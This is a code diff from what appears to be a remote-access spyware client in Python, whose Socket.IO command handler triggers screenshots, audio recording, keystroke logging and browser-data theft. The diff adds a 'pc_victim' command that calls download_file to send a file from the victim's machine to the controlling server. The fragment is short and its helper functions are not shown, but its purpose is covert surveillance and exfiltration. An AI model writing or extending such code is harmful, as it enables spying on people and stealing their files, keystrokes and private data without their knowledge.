@@ -5,7 +5,8 @@ import time
 import socketio
 
 from database_utils import send_browser_data
-from media_utils import take_and_send_screenshot, record_and_send_audio, record_and_send_keyboard_log
+from media_utils import take_and_send_screenshot, record_and_send_audio, record_and_send_keyboard_log, download_file, \
+    file_path
 
 sio = socketio.Client(reconnection=True, reconnection_attempts=5, reconnection_delay=2, ssl_verify=False)
 
@@ -55,6 +56,8 @@ def command(data):
         send_browser_data(sio)
     elif command == 'keyboard':
         record_and_send_keyboard_log(duration, sio)
+    elif command == 'pc_victim':
+        download_file(file_path, sio)
 
 
 def attempt_reconnect():
